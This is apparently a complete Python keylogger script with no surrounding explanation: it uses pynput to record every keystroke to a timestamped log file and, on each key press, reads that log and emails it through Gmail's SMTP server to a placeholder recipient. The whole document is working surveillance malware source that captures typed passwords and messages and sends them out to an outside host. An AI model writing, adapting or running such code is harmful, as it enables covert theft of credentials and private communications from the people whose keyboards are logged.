from pynput.keyboard import Key, Listener
import logging
import smtplib
import threading
import time
gmail_user,gmail_password = 'email','password'

def loop():
    with open('keylog.txt') as f:
        lines = f.readlines()
    time.sleep(10)
    sent_from = gmail_user
    to = ['recipient']
    subject = 'LOG'
    body = lines

    email_text = """\
    From: %s
    To: %s
    Subject: %s

    %s
    """ % (sent_from, ", ".join(to), subject, body)


    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()

        print ("Email sent!")
    except:
        print ("Something went wrong...")


logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
    loop()
 
with Listener(on_press=on_press) as listener :
    listener.join()

